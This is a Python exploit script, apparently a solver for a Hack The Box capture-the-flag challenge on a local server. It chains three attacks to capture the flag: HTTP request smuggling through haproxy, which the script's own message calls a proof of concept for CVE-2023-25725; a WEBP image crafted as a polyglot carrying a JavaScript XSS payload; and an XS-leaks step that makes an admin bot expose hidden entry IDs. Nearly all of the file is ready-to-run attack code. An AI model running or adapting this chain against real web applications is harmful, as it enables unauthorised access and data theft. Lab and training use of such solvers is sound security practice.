import socket, sys, select, io, requests, time, re, json
from PIL import Image
from html import unescape

HOST, PORT = "127.0.0.1", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"
UUID_REGEX = re.compile(
    r'/entry/([0-9a-f]{6}-[0-9a-f]{6})',
    re.IGNORECASE
)

def create_post(title, content, image_data):
    data = {
        "post_title": title,
        "post_body": content,
    }
    
    files = {
        "file": ("upload.webp", image_data, "image/webp")
    }
    
    resp = requests.post(f"{CHALLENGE_URL}/upload_blog_post", data=data, files=files)
    return resp.text.split("<img src=\"/static/uploads/")[1].split("\"")[0]


def generate_webp(xss):
    width, height = 100, 100
    color = (255, 0, 0)
    total_desired_size = 10799 + 8

    image = Image.new("RGB", (width, height), color=color)
    byte_stream = io.BytesIO()
    image.save(byte_stream, format="WEBP")
    webp_data = byte_stream.getvalue()

    if len(webp_data) < total_desired_size:
        webp_data = webp_data + b"\x00" * (total_desired_size - len(webp_data))
    elif len(webp_data) > total_desired_size:
        webp_data = webp_data[:total_desired_size]

    length_bytes = (10799).to_bytes(4, byteorder="little")

    webp_data_fixed = b"RIFF" + length_bytes + webp_data[8:]

    comment = b"*/=1;" + xss.encode()
    webp_data_with_comment = webp_data_fixed + comment
    
    output_stream = io.BytesIO(webp_data_with_comment)
    output_stream.name = "sample.webp"
    output_stream.seek(0)
    return output_stream


def xss_payload(excluded_ids):
    with open("./ss-leak.js", "r", encoding="utf-8") as f:
        js = f.read()

    injected_line = f"const excludedIds = {json.dumps(excluded_ids)};"
    return js.replace("// excludedIds", injected_line)


def fetch_homepage_html():
    resp = requests.get(CHALLENGE_URL)
    return resp.text


def extract_uuids_from_html(html):
    return UUID_REGEX.findall(html)


def get_all_uuids():
    html = fetch_homepage_html()
    uuids = extract_uuids_from_html(html)
    return uuids


def get_flag_uuid_link():
    resp = requests.get(CHALLENGE_URL)
    html_resp = resp.text
    link = html_resp.split("\" alt=\"[FLAG UUID]\"")[0].split("src=\"")[1].split("\" class=\"block\">")[0].split("href=\"")[-1]
    resp = requests.get(f"{CHALLENGE_URL}{link}")
    html_resp = resp.text
    uuid_link = html_resp.split("<div class=\"prose prose-invert max-w-none mb-8\">")[1].split("</div>")[0]
    return "/entry/"+uuid_link


def get_flag(link):
    FLAG_RE = re.compile(r"HTB\{[^}]+\}")
    resp = requests.get(f"{CHALLENGE_URL}{link}")
    match = FLAG_RE.search(resp.text)
    return match.group(0) if match else None


def unlock_panel():
    raw = """GET / HTTP/1.0
Host: localhost:1337
Connection: keep-alive
:x
Content-Length: 200

GET /config/view/enable HTTP/1.1
Host: localhost:1337
Connection: keep-alive
Content-Length: 0
"""
    payload = raw.replace("\n", "\r\n").encode() + b"\r\n" * 160

    with socket.create_connection((HOST, PORT)) as s:
        s.setblocking(False)

        s.sendall(payload)

        inputs = [s, sys.stdin]
        try:
            while True:
                readable, _, _ = select.select(inputs, [], [])
                if s in readable:
                    try:
                        data = s.recv(4096)
                    except BlockingIOError:
                        data = b""
                    if not data:
                        break
                    # sys.stdout.buffer.write(data)
                    # sys.stdout.flush()

                if sys.stdin in readable:
                    line = sys.stdin.buffer.readline()
                    if not line:
                        break
                    try:
                        s.sendall(line)
                    except (BrokenPipeError, ConnectionResetError):
                        break
        except KeyboardInterrupt:
            pass


def main():
    print("[+] Unlocking SCADA dashboard by HTTP smuggling on haproxy (undocumented POC for CVE-2023-25725)")
    unlock_panel()
    time.sleep(10)
    uuids = get_all_uuids()
    print("[+] Got excluded UUIDs")
    xss = xss_payload(uuids)
    print("[+] Generated XS-leaks payload")
    malicious_webp = generate_webp(xss)
    print("[+] Embedded payload into valid WEBP image")
    dummy_webp = generate_webp("")
    location = create_post("test", "test", malicious_webp)
    print("[+] Uploaded WEBP payload")
    create_post("test", f"<script src='/static/uploads/{location}'></script>", dummy_webp)
    print("[+] Created reflection point and triggered bot")
    print("[!] Waiting 30 seconds for leak...")
    time.sleep(30)
    uuid_link = get_flag_uuid_link()
    print("[+] Got flag link:", uuid_link)
    flag = get_flag(uuid_link)
    print(flag)
    
    
if __name__ == "__main__":
    main()
